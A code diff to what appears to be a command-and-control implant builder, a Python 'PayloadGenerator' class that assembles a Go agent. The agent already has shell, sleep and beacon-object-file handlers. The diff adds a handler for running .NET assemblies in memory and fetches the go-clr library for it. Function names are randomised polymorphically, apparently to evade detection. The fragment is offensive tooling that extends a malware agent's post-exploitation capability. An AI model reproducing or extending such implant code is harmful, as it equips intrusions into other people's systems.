@@ -521,6 +521,7 @@ class PayloadGenerator:
         agent_handle_tty_shell_func = poly.generate_random_name('handleTTYShell')
         agent_handle_sleep_func = poly.generate_random_name('handleSleep')
         agent_handle_bof_func = poly.generate_random_name('handleBOF')
+        agent_handle_dotnet_assembly_func = poly.generate_random_name('handleDotNetAssembly')
         agent_process_command_func = poly.generate_random_name('processCommand')
         agent_run_func = poly.generate_random_name('run')
         agent_stop_func = poly.generate_random_name('stop')
@@ -660,6 +661,7 @@ class PayloadGenerator:
         go_code = go_code.replace('{AGENT_HANDLE_TTY_SHELL_FUNC}', agent_handle_tty_shell_func)
         go_code = go_code.replace('{AGENT_HANDLE_SLEEP_FUNC}', agent_handle_sleep_func)
         go_code = go_code.replace('{AGENT_HANDLE_BOF_FUNC}', agent_handle_bof_func)
+        go_code = go_code.replace('{AGENT_HANDLE_DOTNET_ASSEMBLY_FUNC}', agent_handle_dotnet_assembly_func)
         go_code = go_code.replace('{AGENT_PROCESS_COMMAND_FUNC}', agent_process_command_func)
         go_code = go_code.replace('{AGENT_RUN_FUNC}', agent_run_func)
         go_code = go_code.replace('{AGENT_STOP_FUNC}', agent_stop_func)
@@ -804,6 +806,14 @@ class PayloadGenerator:
 
             if result.returncode != 0:
                 raise Exception(f"Failed to get goffloader lighthouse dependency: {result.stderr}")
+
+            # Get go-clr dependency for .NET assembly execution
+            result = subprocess.run([
+                'go', 'get', 'github.com/Ne0nd0g/go-clr'
+            ], capture_output=True, text=True, cwd=temp_dir, env=go_env)
+
+            if result.returncode != 0:
+                raise Exception(f"Failed to get go-clr dependency: {result.stderr}")
 
             if platform.lower() == 'linux':
                 output_filename = 'agent'
